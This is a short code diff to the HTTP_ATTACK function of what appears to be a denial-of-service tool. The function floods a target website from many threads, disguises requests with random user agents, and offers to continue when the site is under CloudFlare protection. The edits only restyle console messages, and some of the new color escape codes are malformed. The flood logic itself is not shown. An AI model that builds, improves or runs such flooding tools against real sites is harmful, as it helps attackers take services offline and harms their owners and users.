@@ -36,10 +36,10 @@ def HTTP_ATTACK(threads, attack_time, target):
 	FINISH = False
 
 	if ipTools.isCloudFlare(target):
-		if not input("[WARNING] Current site is under CloudFlare protection. Continue? y/N: ") in ("y", "Y", "1"):
+		if not input('\033[1;33'+"[!]"+'\033[0m'+" Current site is under CloudFlare protection. \n"+'\033[1m'+"[?]"+'\033[0m'+"Continue? y/N: ") in ("y", "Y", "1"):
 			exit()
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print('\033[1;34'+"[*]"+'\033[0m'+" Attack started for " + str(attack_time) + " seconds...")
 	
 	threads_list = []
 	# Load 25 random user agents
@@ -74,7 +74,7 @@ def HTTP_ATTACK(threads, attack_time, target):
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[BEGIN] Staring thread " + str(thread) + "...")
+		print('\033[1;34'+"[*]"+'\033[0m'+" Staring thread " + str(thread) + "...")
 		t = Thread(target = http_flood)
 		t.start()
 		threads_list.append(t)
@@ -85,4 +85,4 @@ def HTTP_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] HTTP attack stopped!")
+	print('\033[1;33'+"[!]"+'\033[0m'+" HTTP attack stopped!")
